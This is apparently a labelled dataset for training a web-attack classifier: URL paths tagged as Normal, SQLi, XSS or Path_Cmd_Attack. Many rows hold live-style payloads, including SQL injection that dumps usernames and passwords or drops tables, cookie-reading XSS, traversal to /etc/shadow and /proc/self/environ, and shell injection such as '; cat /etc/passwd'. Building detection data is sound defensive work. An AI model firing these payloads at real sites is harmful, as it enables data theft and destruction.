+/cart/view?msg=%3Ca%20href%3D%22javascript%3Aconfirm%28932%29%22%3Eclick_932%3C/a%3E,XSS
+"/api/v1/items?comment=<a href=""javascript:confirm(2)"">click_2</a>",XSS
+/render?ip=`cat /etc/issue`&v=207,Path_Cmd_Attack
+/export?doc=8.8.8.8 | whoami&v=23,Path_Cmd_Attack
+/assets/img/bundle_89.min.js?v=7.8,Normal
+/user/profile?cat=4661' AND (SELECT COUNT(*) FROM information_schema.tables)>18--,SQLi
+/view?file=../../../etc/shadow&v=142,Path_Cmd_Attack
+/download?dir=file_675.txt; id; uname -a&v=108,Path_Cmd_Attack
+/blog/post?msg=%3Cscript%3Ealert%28945%29%3C/script%3E,XSS
+/search?id=94541&cat=software&sort=newest,Normal
+/api/v1/items?article_id=339admin'--,SQLi
+/api/v2/users/5904/orders?status=paid&limit=20,Normal
+/index.html?id=4451; DROP TABLE users--,SQLi
+/checkout?id=3331%27%20UNION%20ALL%20SELECT%20NULL%2Cversion%28%29%2Cdatabase%28%29%23,SQLi
+/api/v2/users/510/orders?status=shipped&limit=50,Normal
+/forum/thread?q=alert+system+for+smart+home+security+81&page=19&lang=fr,Normal
+/blog/post?uid=9771' AND (SELECT COUNT(*) FROM information_schema.tables)>58--,SQLi
+/assets/img/bundle_84.min.js?v=7.9,Normal
+/view?ip=8.8.8.8 | whoami&v=2,Path_Cmd_Attack
+/cart/view?q=68' OR 'a'='a,SQLi
+/products?name=<input autofocus onfocus=alert(document.cookie)>,XSS
+/assets/css/bundle_145.min.js?v=3.2,Normal
+/blog/2020/etc-group-study-materials-288?ref=nav_20,Normal
+/user/profile?user=4491%3B%20DROP%20TABLE%20users--,SQLi
+/support/ticket?q=1471%27%20WAITFOR%20DELAY%20%270%3A0%3A31%27--,SQLi
+/support/ticket?q=<img src=x onerror=alert(509)>,XSS
+/api/v2/users/4789/orders?status=pending&limit=50,Normal
+/assets/img/bundle_91.min.js?v=2.6,Normal
+/search?q=drop+shipping+guide+for+beginners+99&page=5&lang=ar,Normal
+/ping?host=127.0.0.1; cat /etc/passwd&v=17,Path_Cmd_Attack
+"/support/ticket?order_id=557' UNION/**/SELECT/**/table_name,NULL/**/FROM/**/information_schema.tables--",SQLi
+/courses/view?id=3971%27%20ORDER%20BY%2061--,SQLi
+/diag?file=../../../../etc/passwd&v=205,Path_Cmd_Attack
+/checkout?item_id=560%27%20OR%20EXISTS%28SELECT%20%2A%20FROM%20admins%20WHERE%20id%3D22%29--,SQLi
+/api/v1/items?uid=940' OR EXISTS(SELECT * FROM admins WHERE id=49)--,SQLi
+/search?id=91383&cat=security&sort=rating,Normal
+"/cart/view?callback='><iframe src=""javascript:alert(702)""></iframe>",XSS
+/assets/css/bundle_136.min.js?v=9.4,Normal
+/user/profile?id=51718&cat=electronics&sort=newest,Normal
+/api/v2/users/1969/orders?status=pending&limit=20,Normal
+"/forum/thread?redirect=""><script>alert(document.cookie)</script>",XSS
+/checkout?cat=8041' AND (SELECT COUNT(*) FROM information_schema.tables)>40--,SQLi
+/index.html?q=best+laptops+2026+41&page=13&lang=ar,Normal
+/forum/thread?q=web+development+course+78&page=21&lang=en,Normal
+/ping?file=/var/www/html/../../etc/hosts&v=202,Path_Cmd_Attack
+"/search?title=<a href=""javascript:confirm(625)"">click_625</a>",XSS
+/export?host=%24%28whoami%29&v=113,Path_Cmd_Attack
+/search?q=windows+11+installation+guide+21&page=15&lang=fr,Normal
+/user/profile?user=7421%27%20AND%20ASCII%28SUBSTRING%28%28SELECT%20password%20FROM%20users%20LIMIT%201%29%2C1%2C1%29%29%3E48--,SQLi
+/forum/thread?order_id=520admin%27--,SQLi
+/forum/thread?id=60982&cat=security&sort=rating,Normal
+/api/v2/users/7716/orders?status=paid&limit=50,Normal
+/news/article?item_id=286%27%20OR%20EXISTS%28SELECT%20%2A%20FROM%20admins%20WHERE%20id%3D51%29--,SQLi
+/checkout?q=etc+group+study+materials+4&page=13&lang=fr,Normal
+/api/v1/items?q=script+writing+tips+for+youtube+50&page=23&lang=en,Normal
+/diag?dir=../../../etc/shadow&v=79,Path_Cmd_Attack
+/products?title=%3Cdetails%20open%20ontoggle%3Dalert%2812%29%3E,XSS
+/products?id=6121' WAITFOR DELAY '0:0:99'--,SQLi
+"/forum/thread?comment=""><script>alert(document.cookie)</script>",XSS
+/user/profile?id=46899&cat=software&sort=price_desc,Normal
+/api/v1/items?q=drop+shipping+guide+for+beginners+23&page=20&lang=en,Normal
+/news/article?search=%3Cbody%20onload%3Dprompt%28310%29%3E,XSS
+/export?cmd=../../../../proc/self/environ&v=122,Path_Cmd_Attack
+/courses/view?q=alert+system+for+smart+home+security+86&page=16&lang=en,Normal
+/user/profile?search=<script>alert(965)</script>,XSS
+/news/article?id=95322&cat=cloud&sort=newest,Normal
+/forum/thread?uid=104%27%20OR%201%3D1--,SQLi
+/export?doc=../../../etc/shadow&v=170,Path_Cmd_Attack
+/forum/thread?q=update+my+account+settings+and+password+48&page=12&lang=en,Normal
+/cart/view?q=sleep+tracker+smartwatch+review+1&page=24&lang=fr,Normal
+/api/v2/users/1682/orders?status=shipped&limit=50,Normal
+/courses/view?comment=javascript%3Aalert%28document.domain%29,XSS
+/news/article?search=%3Csvg/onload%3Dalert%28%27XSS_453%27%29%3E,XSS
+/index.html?q=iframe+responsive+css+tutorial+11&page=3&lang=fr,Normal
+/user/profile?comment=%22%3Balert%28String.fromCharCode%2888%2C83%2C83%2C972%29%29//,XSS
+/api/v2/users/1060/orders?status=pending&limit=20,Normal
+/ping?host=../../../../proc/self/environ&v=119,Path_Cmd_Attack
+/products?q=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,XSS
+/api/v2/users/8199/orders?status=paid&limit=10,Normal
+/news/article?q=how+to+learn+python+10&page=23&lang=fr,Normal
+/blog/post?order_id=7181; DROP TABLE users--,SQLi
+/diag?host=../../../../etc/passwd&v=164,Path_Cmd_Attack
+/api/v1/items?comment=<script>alert(567)</script>,XSS
+/api/v2/users/3077/orders?status=pending&limit=20,Normal
+/support/ticket?cat=7671%27%20AND%20ASCII%28SUBSTRING%28%28SELECT%20password%20FROM%20users%20LIMIT%201%29%2C1%2C1%29%29%3E79--,SQLi
+/render?cmd=localhost%20%26%26%20ls%20-la%20/home&v=91,Path_Cmd_Attack
+/index.html?user=7681' ORDER BY 47--,SQLi
+/api/v2/users/5280/orders?status=pending&limit=10,Normal
+/blog/2026/script-writing-tips-for-youtube-11?ref=nav_10,Normal
+/search?cat=232' OR 'a'='a,SQLi
+/blog/2024/linux-server-setup-cat-command-tutorial-94?ref=nav_11,Normal
+/view?path=localhost && ls -la /home&v=105,Path_Cmd_Attack
+/api/v1/items?msg=<input autofocus onfocus=alert(document.cookie)>,XSS
+/api/v2/users/9470/orders?status=paid&limit=50,Normal
+/checkout?uid=992%27%20HAVING%201%3D1--,SQLi
+/assets/css/bundle_135.min.js?v=5.0,Normal
+/forum/thread?q=556%27%20OR%20EXISTS%28SELECT%20%2A%20FROM%20admins%20WHERE%20id%3D91%29--,SQLi
+/news/article?id=88118&cat=security&sort=rating,Normal
+/blog/post?uid=2471; DROP TABLE users--,SQLi
+/ping?doc=`cat /etc/issue`&v=134,Path_Cmd_Attack
+/products?id=4761; DROP TABLE users--,SQLi
+/forum/thread?search=<input autofocus onfocus=alert(document.cookie)>,XSS
+"/forum/thread?order_id=303-1 UNION SELECT 1,username,password FROM users--",SQLi
+/support/ticket?q=web+development+course+76&page=23&lang=fr,Normal
+/checkout?q=sleep+tracker+smartwatch+review+71&page=5&lang=ar,Normal
+/user/profile?order_id=9611' ORDER BY 17--,SQLi
+/cart/view?id=42569&cat=clothing&sort=rating,Normal
+/assets/img/bundle_30.min.js?v=3.4,Normal
+/cart/view?order_id=79' HAVING 1=1--,SQLi
+/api/v1/items?redirect=%27%3E%3Ciframe%20src%3D%22javascript%3Aalert%28611%29%22%3E%3C/iframe%3E,XSS
+/search?cat=8651%27%20UNION%20ALL%20SELECT%20NULL%2Cversion%28%29%2Cdatabase%28%29%23,SQLi
+/courses/view?q=alert+system+for+smart+home+security+6&page=2&lang=fr,Normal
+/assets/css/bundle_26.min.js?v=4.4,Normal
+/search?q=linux+server+setup+cat+command+tutorial+41&page=18&lang=en,Normal
+/blog/2022/ping-test-speed-for-gaming-router-175?ref=nav_2,Normal
+/ping?doc=10.0.0.793%3B%20ping%20-c%204%20127.0.0.1&v=38,Path_Cmd_Attack
+/ping?dir=127.0.0.1; cat /etc/passwd&v=12,Path_Cmd_Attack
+/blog/post?id=12098&cat=networking&sort=newest,Normal
+/user/profile?q=617%27%20OR%20EXISTS%28SELECT%20%2A%20FROM%20admins%20WHERE%20id%3D97%29--,SQLi
+"/checkout?title="";alert(String.fromCharCode(88,83,83,398))//",XSS
+/search?article_id=406' OR EXISTS(SELECT * FROM admins WHERE id=4)--,SQLi
+/render?path=127.0.0.1%3B%20cat%20/etc/passwd&v=180,Path_Cmd_Attack
+/render?file=../../../../proc/self/environ&v=21,Path_Cmd_Attack
+/index.html?cat=553' OR 'a'='a,SQLi
+/diag?path=../../../../proc/self/environ&v=3,Path_Cmd_Attack
+/support/ticket?comment=<input autofocus onfocus=alert(document.cookie)>,XSS
+/forum/thread?search=<details open ontoggle=alert(467)>,XSS
+/download?page=`cat /etc/issue`&v=40,Path_Cmd_Attack
+/products?id=646%27%20OR%201%3D1--,SQLi
+"/news/article?search=""><script>alert(document.cookie)</script>",XSS
+/api/v1/items?user=372%27%20HAVING%201%3D1--,SQLi
+/courses/view?article_id=196admin'--,SQLi
+/api/v1/items?search=<input autofocus onfocus=alert(document.cookie)>,XSS
+/support/ticket?search=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,XSS
+/assets/img/bundle_35.min.js?v=2.4,Normal
+/search?user=5601%27%20WAITFOR%20DELAY%20%270%3A0%3A18%27--,SQLi
+/api/v2/users/8056/orders?status=pending&limit=20,Normal
+/index.html?article_id=795admin'--,SQLi
+/api/v1/items?q=union+bank+branch+locations+near+me+32&page=24&lang=fr,Normal
+/search?cmd=../../../../etc/passwd&v=50,Path_Cmd_Attack
+/render?host=10.0.0.603; ping -c 4 127.0.0.1&v=136,Path_Cmd_Attack
+/support/ticket?q=<input autofocus onfocus=alert(document.cookie)>,XSS
+"/forum/thread?order_id=437' UNION/**/SELECT/**/table_name,NULL/**/FROM/**/information_schema.tables--",SQLi
+/support/ticket?id=62423&cat=databases&sort=newest,Normal
+/api/v1/items?cat=4931%27%20UNION%20ALL%20SELECT%20NULL%2Cversion%28%29%2Cdatabase%28%29%23,SQLi
+/checkout?user=94' AND SLEEP(92)--,SQLi
+/render?path=/var/www/html/../../etc/hosts&v=157,Path_Cmd_Attack
+"/support/ticket?search="";alert(String.fromCharCode(88,83,83,98))//",XSS
+/export?page=file_5.txt; id; uname -a&v=109,Path_Cmd_Attack
+/checkout?q=windows+11+installation+guide+4&page=2&lang=ar,Normal
+/api/v2/users/9662/orders?status=shipped&limit=50,Normal
+/checkout?id=75632&cat=electronics&sort=price_desc,Normal
+/api/v2/users/7338/orders?status=paid&limit=50,Normal
+/user/profile?title=<img src=x onerror=alert(397)>,XSS
+/search?q=etc+group+study+materials+58&page=5&lang=ar,Normal
+/cart/view?title=%3Cimg%20src%3Dx%20onerror%3Dalert%28181%29%3E,XSS
+/products?q=iframe+responsive+css+tutorial+55&page=19&lang=ar,Normal
+/checkout?item_id=868%27%20OR%20%27a%27%3D%27a,SQLi
+/support/ticket?msg=%27%3E%3Ciframe%20src%3D%22javascript%3Aalert%28672%29%22%3E%3C/iframe%3E,XSS
+"/blog/post?redirect=""><script>alert(document.cookie)</script>",XSS
+/view?page=8.8.8.8 | whoami&v=214,Path_Cmd_Attack
+/download?template=localhost && ls -la /home&v=110,Path_Cmd_Attack
+/search?article_id=701admin'--,SQLi
+/search?article_id=9571%27%20WAITFOR%20DELAY%20%270%3A0%3A62%27--,SQLi
+/api/v1/items?q=iframe+responsive+css+tutorial+37&page=15&lang=en,Normal
+/diag?page=..\..\..\windows\win.ini&v=77,Path_Cmd_Attack
+/search?id=618admin'--,SQLi
+/render?cmd=../../../../proc/self/environ&v=159,Path_Cmd_Attack
+/checkout?q=how+to+prevent+sql+injection+and+xss+34&page=11&lang=ar,Normal
+/blog/2023/union-bank-branch-locations-near-me-200?ref=nav_10,Normal
+/ping?path=10.0.0.361; ping -c 4 127.0.0.1&v=121,Path_Cmd_Attack
+/products?cat=858' OR 'a'='a,SQLi
+/api/v2/users/1333/orders?status=pending&limit=10,Normal
+/support/ticket?q=order+status+and+tracking+id+58&page=8&lang=ar,Normal
+/view?host=../../../../proc/self/environ&v=37,Path_Cmd_Attack
+/user/profile?search=<input autofocus onfocus=alert(document.cookie)>,XSS
+/search?q=ping+test+speed+for+gaming+router+86&page=4&lang=fr,Normal
+/download?doc=localhost%20%26%26%20ls%20-la%20/home&v=215,Path_Cmd_Attack
+/courses/view?article_id=426%27%20OR%20%27a%27%3D%27a,SQLi
+/search?search=<body onload=prompt(263)>,XSS
+/view?doc=/var/www/html/../../etc/hosts&v=7,Path_Cmd_Attack
+/forum/thread?item_id=695' OR 1=1--,SQLi
+/products?article_id=901; DROP TABLE users--,SQLi
+/download?path=..%5C..%5C..%5Cwindows%5Cwin.ini&v=161,Path_Cmd_Attack
+/forum/thread?name=<img src=x onerror=alert(896)>,XSS
+"/index.html?order_id=672"" OR ""1""=""1""--",SQLi
+"/checkout?msg=<a href=""javascript:confirm(923)"">click_923</a>",XSS
+/api/v2/users/5800/orders?status=paid&limit=20,Normal
+/ping?host=10.0.0.694%3B%20ping%20-c%204%20127.0.0.1&v=70,Path_Cmd_Attack
+/support/ticket?uid=125-1%20UNION%20SELECT%201%2Cusername%2Cpassword%20FROM%20users--,SQLi
+/export?cmd=../../../../proc/self/environ&v=20,Path_Cmd_Attack
+/view?template=localhost && ls -la /home&v=210,Path_Cmd_Attack
+/blog/2026/where-to-buy-table-lamps-from-ikea-242?ref=nav_18,Normal
+/blog/post?q=<svg/onload=alert('XSS_856')>,XSS
+/news/article?comment=<scr<script>ipt>alert(723)</scr</script>ipt>,XSS
+/assets/js/bundle_117.min.js?v=2.5,Normal
+/blog/2024/order-status-and-tracking-id-265?ref=nav_4,Normal
+/view?template=10.0.0.370%3B%20ping%20-c%204%20127.0.0.1&v=204,Path_Cmd_Attack
+/blog/post?item_id=498' AND SLEEP(44)--,SQLi
+/blog/2020/linux-server-setup-cat-command-tutorial-103?ref=nav_8,Normal
+/checkout?title=%3Cscr%3Cscript%3Eipt%3Ealert%28781%29%3C/scr%3C/script%3Eipt%3E,XSS
+"/news/article?user=4611' UNION ALL SELECT NULL,version(),database()#",SQLi
+/blog/2025/where-to-buy-table-lamps-from-ikea-215?ref=nav_3,Normal
+/products?q=select+best+monitor+for+gaming+and+office+49&page=9&lang=ar,Normal
+/assets/css/bundle_12.min.js?v=8.8,Normal
+/ping?page=..%5C..%5C..%5Cwindows%5Cwin.ini&v=46,Path_Cmd_Attack
+/courses/view?msg=<scr<script>ipt>alert(822)</scr</script>ipt>,XSS
+"/products?q='><iframe src=""javascript:alert(586)""></iframe>",XSS
+/assets/img/bundle_57.min.js?v=8.3,Normal
+/courses/view?item_id=551%27%20OR%20EXISTS%28SELECT%20%2A%20FROM%20admins%20WHERE%20id%3D16%29--,SQLi
+/api/v2/users/1980/orders?status=shipped&limit=10,Normal
+/checkout?cat=9691%27%20UNION%20ALL%20SELECT%20NULL%2Cversion%28%29%2Cdatabase%28%29%23,SQLi
+/render?template=../../../../proc/self/environ&v=206,Path_Cmd_Attack
+/search?uid=1441' WAITFOR DELAY '0:0:50'--,SQLi
+/checkout?id=99694&cat=cloud&sort=price_desc,Normal
+/checkout?msg=%27%3E%3Ciframe%20src%3D%22javascript%3Aalert%28645%29%22%3E%3C/iframe%3E,XSS
+/cart/view?cat=5471%27%20WAITFOR%20DELAY%20%270%3A0%3A37%27--,SQLi
+/download?file=../../../etc/shadow&v=72,Path_Cmd_Attack
+/forum/thread?item_id=613%27%20HAVING%201%3D1--,SQLi
+/api/v1/items?q=windows+11+installation+guide+28&page=2&lang=fr,Normal
+/blog/2020/etc-group-study-materials-131?ref=nav_12,Normal
+"/support/ticket?search=<a href=""javascript:confirm(996)"">click_996</a>",XSS
+/download?template=../../../../proc/self/environ&v=14,Path_Cmd_Attack
+/ping?dir=....//....//....//etc/passwd&v=47,Path_Cmd_Attack
+/assets/css/bundle_30.min.js?v=5.9,Normal
+/render?doc=..\..\..\windows\win.ini&v=182,Path_Cmd_Attack
+/diag?file=../../../../proc/self/environ&v=107,Path_Cmd_Attack
+/courses/view?uid=282' OR 1=1--,SQLi
+/user/profile?q=etc+group+study+materials+8&page=19&lang=fr,Normal
+"/user/profile?title="";alert(String.fromCharCode(88,83,83,29))//",XSS
+/blog/post?search=javascript:alert(document.domain),XSS
+"/blog/post?user=394"" OR ""1""=""1""--",SQLi
+/news/article?order_id=8741%27%20RLIKE%20%28SELECT%20%28CASE%20WHEN%20%2826%3D26%29%20THEN%200x61646d696e%20ELSE%200x28%20END%29%29--,SQLi
+/index.html?msg=<scr<script>ipt>alert(303)</scr</script>ipt>,XSS
+/courses/view?q=iframe+responsive+css+tutorial+74&page=16&lang=en,Normal
+"/forum/thread?redirect='><iframe src=""javascript:alert(30)""></iframe>",XSS
+/user/profile?q=union+bank+branch+locations+near+me+28&page=25&lang=ar,Normal
+/ping?path=127.0.0.1%3B%20cat%20/etc/passwd&v=6,Path_Cmd_Attack
+"/cart/view?item_id=247-1 UNION SELECT 1,username,password FROM users--",SQLi
+/forum/thread?id=46358&cat=cloud&sort=popular,Normal
+/api/v2/users/6965/orders?status=shipped&limit=50,Normal
+/search?file=10.0.0.955; ping -c 4 127.0.0.1&v=178,Path_Cmd_Attack
+/search?q=ping+test+speed+for+gaming+router+36&page=24&lang=fr,Normal
+/blog/post?q=128%27%20OR%20%27a%27%3D%27a,SQLi
+/blog/post?search=<script>alert(344)</script>,XSS
+/blog/2024/how-to-prevent-sql-injection-and-xss-255?ref=nav_12,Normal
+/search?file=....//....//....//etc/passwd&v=166,Path_Cmd_Attack
+/ping?ip=../../../etc/shadow&v=126,Path_Cmd_Attack
+/checkout?id=16548&cat=cloud&sort=rating,Normal
+/checkout?id=10590&cat=ai&sort=rating,Normal
+/assets/js/bundle_17.min.js?v=8.4,Normal
+/api/v1/items?q=ping+test+speed+for+gaming+router+38&page=24&lang=ar,Normal
+/cart/view?q=shadow+of+the+tomb+raider+review+35&page=1&lang=ar,Normal
+"/forum/thread?q=236-1 UNION SELECT 1,username,password FROM users--",SQLi
+/index.html?q=shadow+of+the+tomb+raider+review+47&page=20&lang=ar,Normal
+/blog/post?q=iframe+responsive+css+tutorial+56&page=21&lang=ar,Normal
+/blog/2026/select-best-monitor-for-gaming-and-office-275?ref=nav_18,Normal
+/blog/post?redirect=%27%3E%3Ciframe%20src%3D%22javascript%3Aalert%28463%29%22%3E%3C/iframe%3E,XSS
+/api/v1/items?id=79888&cat=networking&sort=rating,Normal
+/search?id=8351' WAITFOR DELAY '0:0:40'--,SQLi
+/products?order_id=3781%27%20AND%20ASCII%28SUBSTRING%28%28SELECT%20password%20FROM%20users%20LIMIT%201%29%2C1%2C1%29%29%3E58--,SQLi
+/render?doc=8.8.8.8%20%7C%20whoami&v=155,Path_Cmd_Attack
+/assets/img/bundle_127.min.js?v=8.1,Normal
+/api/v1/items?comment=<body onload=prompt(863)>,XSS
+/courses/view?id=48394&cat=mobile&sort=rating,Normal
+/export?ip=/var/www/html/../../etc/hosts&v=177,Path_Cmd_Attack
+/index.html?order_id=6701' RLIKE (SELECT (CASE WHEN (77=77) THEN 0x61646d696e ELSE 0x28 END))--,SQLi
+/view?page=$(whoami)&v=145,Path_Cmd_Attack
+/api/v1/items?q=windows+11+installation+guide+93&page=11&lang=fr,Normal
+/api/v2/users/7385/orders?status=pending&limit=20,Normal
+/ping?template=../../../../proc/self/environ&v=15,Path_Cmd_Attack
+/api/v2/users/1391/orders?status=shipped&limit=20,Normal
+/ping?host=file_979.txt; id; uname -a&v=73,Path_Cmd_Attack
+/index.html?redirect=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,XSS
+/products?redirect=<img src=x onerror=alert(380)>,XSS
+/news/article?cat=537' OR 'a'='a,SQLi
+/download?template=10.0.0.762; ping -c 4 127.0.0.1&v=83,Path_Cmd_Attack
+/diag?cmd=file_393.txt%3B%20id%3B%20uname%20-a&v=41,Path_Cmd_Attack
+/blog/2023/alert-system-for-smart-home-security-225?ref=nav_9,Normal
+/news/article?msg=<details open ontoggle=alert(378)>,XSS
+/api/v1/items?item_id=9711%27%20WAITFOR%20DELAY%20%270%3A0%3A91%27--,SQLi
+/blog/2021/select-best-monitor-for-gaming-and-office-69?ref=nav_9,Normal
+/export?page=../../../../proc/self/environ&v=217,Path_Cmd_Attack
+/download?template=..\..\..\windows\win.ini&v=67,Path_Cmd_Attack
+/download?file=localhost%20%26%26%20ls%20-la%20/home&v=124,Path_Cmd_Attack
+/assets/js/bundle_130.min.js?v=2.4,Normal
+/products?name=<scr<script>ipt>alert(641)</scr</script>ipt>,XSS
+/api/v1/items?order_id=33' AND SLEEP(93)--,SQLi
+/cart/view?item_id=3061' AND (SELECT COUNT(*) FROM information_schema.tables)>1--,SQLi
+/search?id=6661' WAITFOR DELAY '0:0:13'--,SQLi
+/index.html?q=ping+test+speed+for+gaming+router+15&page=4&lang=en,Normal
+/export?file=`cat /etc/issue`&v=54,Path_Cmd_Attack
+"/cart/view?search=<a href=""javascript:confirm(850)"">click_850</a>",XSS
+"/user/profile?article_id=681' UNION ALL SELECT NULL,version(),database()#",SQLi
+/search?id=416-1%20UNION%20SELECT%201%2Cusername%2Cpassword%20FROM%20users--,SQLi
+/api/v2/users/4620/orders?status=pending&limit=10,Normal
+/user/profile?msg=%3Cscr%3Cscript%3Eipt%3Ealert%28580%29%3C/scr%3C/script%3Eipt%3E,XSS
+/support/ticket?search=%3Cscript%3Ealert%28870%29%3C/script%3E,XSS
+/diag?path=..\..\..\windows\win.ini&v=100,Path_Cmd_Attack
+/products?cat=1431%3B%20DROP%20TABLE%20users--,SQLi
+/api/v2/users/6912/orders?status=pending&limit=10,Normal
+/user/profile?item_id=8501%27%20UNION%20ALL%20SELECT%20NULL%2Cversion%28%29%2Cdatabase%28%29%23,SQLi
+/api/v2/users/9919/orders?status=pending&limit=10,Normal
+/ping?ip=/var/www/html/../../etc/hosts&v=148,Path_Cmd_Attack
+/index.html?id=43720&cat=clothing&sort=newest,Normal
+/products?search=<body onload=prompt(175)>,XSS
+/render?cmd=127.0.0.1%3B%20cat%20/etc/passwd&v=187,Path_Cmd_Attack
+/cart/view?item_id=3031' ORDER BY 11--,SQLi
+"/user/profile?article_id=5281' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>20--",SQLi
+/search?host=....//....//....//etc/passwd&v=117,Path_Cmd_Attack
+/render?path=8.8.8.8%20%7C%20whoami&v=74,Path_Cmd_Attack
+/blog/2023/etc-group-study-materials-4?ref=nav_8,Normal
+/products?redirect=%3Cinput%20autofocus%20onfocus%3Dalert%28document.cookie%29%3E,XSS
+"/courses/view?order_id=404-1 UNION SELECT 1,username,password FROM users--",SQLi
+/index.html?user=1851%27%20RLIKE%20%28SELECT%20%28CASE%20WHEN%20%285%3D5%29%20THEN%200x61646d696e%20ELSE%200x28%20END%29%29--,SQLi
+/api/v1/items?redirect=<script>alert(406)</script>,XSS
+/view?cmd=..\..\..\windows\win.ini&v=158,Path_Cmd_Attack
+/blog/2020/windows-11-installation-guide-231?ref=nav_13,Normal
+/blog/2022/best-laptops-2026-283?ref=nav_20,Normal
+/user/profile?cat=88' HAVING 1=1--,SQLi
+"/courses/view?q=806"" OR ""1""=""1""--",SQLi
+/render?host=file_474.txt; id; uname -a&v=188,Path_Cmd_Attack
+/diag?cmd=..%5C..%5C..%5Cwindows%5Cwin.ini&v=56,Path_Cmd_Attack
+/index.html?q=union+bank+branch+locations+near+me+73&page=22&lang=ar,Normal
+/news/article?search=%3Cscr%3Cscript%3Eipt%3Ealert%28138%29%3C/scr%3C/script%3Eipt%3E,XSS
+/blog/2020/order-status-and-tracking-id-92?ref=nav_17,Normal
+/view?path=../../../../etc/passwd&v=173,Path_Cmd_Attack
+"/products?title="";alert(String.fromCharCode(88,83,83,629))//",XSS
+/blog/2021/script-writing-tips-for-youtube-15?ref=nav_15,Normal
+/blog/post?title=<script>alert(346)</script>,XSS
+/support/ticket?q=iframe+responsive+css+tutorial+75&page=22&lang=ar,Normal
+/user/profile?comment=<script>alert(406)</script>,XSS
+/download?template=../../../../proc/self/environ&v=213,Path_Cmd_Attack
+/cart/view?uid=9571' AND (SELECT COUNT(*) FROM information_schema.tables)>21--,SQLi
+/checkout?title=%22%3Balert%28String.fromCharCode%2888%2C83%2C83%2C515%29%29//,XSS
+/api/v1/items?user=451%27%20AND%20ASCII%28SUBSTRING%28%28SELECT%20password%20FROM%20users%20LIMIT%201%29%2C1%2C1%29%29%3E5--,SQLi
+/forum/thread?article_id=111%27%20UNION/%2A%2A/SELECT/%2A%2A/table_name%2CNULL/%2A%2A/FROM/%2A%2A/information_schema.tables--,SQLi
+/ping?doc=file_304.txt%3B%20id%3B%20uname%20-a&v=68,Path_Cmd_Attack
+/assets/css/bundle_138.min.js?v=6.0,Normal
+/search?q=update+my+account+settings+and+password+39&page=1&lang=fr,Normal
+/forum/thread?id=3279&cat=security&sort=price_desc,Normal
+/diag?cmd=8.8.8.8 | whoami&v=208,Path_Cmd_Attack
+/courses/view?id=59610&cat=ai&sort=newest,Normal
+/news/article?item_id=336%27%20UNION/%2A%2A/SELECT/%2A%2A/table_name%2CNULL/%2A%2A/FROM/%2A%2A/information_schema.tables--,SQLi
+/blog/2025/drop-shipping-guide-for-beginners-36?ref=nav_10,Normal
+/support/ticket?q=<svg/onload=alert('XSS_590')>,XSS
+/blog/2021/web-development-course-173?ref=nav_8,Normal
+/export?template=file_499.txt%3B%20id%3B%20uname%20-a&v=154,Path_Cmd_Attack
+/assets/css/bundle_34.min.js?v=2.4,Normal
+"/user/profile?redirect=""><script>alert(document.cookie)</script>",XSS
+/user/profile?order_id=6091' AND (SELECT COUNT(*) FROM information_schema.tables)>93--,SQLi
+/api/v1/items?user=5691; DROP TABLE users--,SQLi
+/download?template=../../../etc/shadow&v=212,Path_Cmd_Attack
+/blog/2024/ping-test-speed-for-gaming-router-34?ref=nav_6,Normal
+/cart/view?id=29452&cat=books&sort=popular,Normal
+/products?q=how+to+learn+python+12&page=24&lang=fr,Normal
+/cart/view?q=4411' ORDER BY 43--,SQLi
+/search?comment=<svg/onload=alert('XSS_844')>,XSS
+/api/v2/users/8924/orders?status=paid&limit=20,Normal
+/assets/css/bundle_148.min.js?v=4.1,Normal
+/cart/view?uid=981' WAITFOR DELAY '0:0:12'--,SQLi
+/user/profile?uid=7141%27%20AND%20ASCII%28SUBSTRING%28%28SELECT%20password%20FROM%20users%20LIMIT%201%29%2C1%2C1%29%29%3E73--,SQLi
+"/api/v1/items?name=""><script>alert(document.cookie)</script>",XSS
+/forum/thread?q=alert+system+for+smart+home+security+19&page=3&lang=en,Normal
+/assets/js/bundle_48.min.js?v=2.9,Normal
+"/search?search=""><script>alert(document.cookie)</script>",XSS
+/search?search=%3Cscript%3Ealert%28212%29%3C/script%3E,XSS
+/api/v2/users/6978/orders?status=paid&limit=20,Normal
+/user/profile?order_id=3341' RLIKE (SELECT (CASE WHEN (74=74) THEN 0x61646d696e ELSE 0x28 END))--,SQLi
+/api/v1/items?search=<script>alert(64)</script>,XSS
+/download?dir=../../../../etc/passwd&v=31,Path_Cmd_Attack
+/search?page=../../../etc/shadow&v=34,Path_Cmd_Attack
+/courses/view?order_id=5471%27%20UNION%20ALL%20SELECT%20NULL%2Cversion%28%29%2Cdatabase%28%29%23,SQLi
+/export?dir=../../../../proc/self/environ&v=179,Path_Cmd_Attack
+/checkout?id=32494&cat=software&sort=price_asc,Normal
+/cart/view?name=<scr<script>ipt>alert(730)</scr</script>ipt>,XSS
+/blog/2021/union-bank-branch-locations-near-me-81?ref=nav_6,Normal
+/render?page=/var/www/html/../../etc/hosts&v=57,Path_Cmd_Attack
+/api/v1/items?id=57899&cat=ai&sort=rating,Normal
+/blog/2020/how-to-learn-python-269?ref=nav_16,Normal
+/assets/img/bundle_26.min.js?v=2.8,Normal
+/assets/css/bundle_89.min.js?v=6.6,Normal
+"/user/profile?order_id=5061' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>83--",SQLi
+/ping?file=$(whoami)&v=153,Path_Cmd_Attack
+/diag?host=$(whoami)&v=198,Path_Cmd_Attack
+/cart/view?q=how+to+learn+python+64&page=11&lang=en,Normal
+/blog/2022/drop-shipping-guide-for-beginners-93?ref=nav_14,Normal
+/search?doc=file_340.txt; id; uname -a&v=98,Path_Cmd_Attack
+/search?title=<scr<script>ipt>alert(860)</scr</script>ipt>,XSS
+/blog/post?article_id=4651' AND (SELECT COUNT(*) FROM information_schema.tables)>88--,SQLi
+/products?id=75244&cat=security&sort=popular,Normal
+/api/v2/users/4445/orders?status=paid&limit=20,Normal
+"/search?msg='><iframe src=""javascript:alert(714)""></iframe>",XSS
+/ping?template=..\..\..\windows\win.ini&v=162,Path_Cmd_Attack
+/export?doc=127.0.0.1; cat /etc/passwd&v=114,Path_Cmd_Attack
+/search?q=<svg/onload=alert('XSS_89')>,XSS
+/search?name=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,XSS
+/courses/view?q=3841' AND (SELECT COUNT(*) FROM information_schema.tables)>50--,SQLi
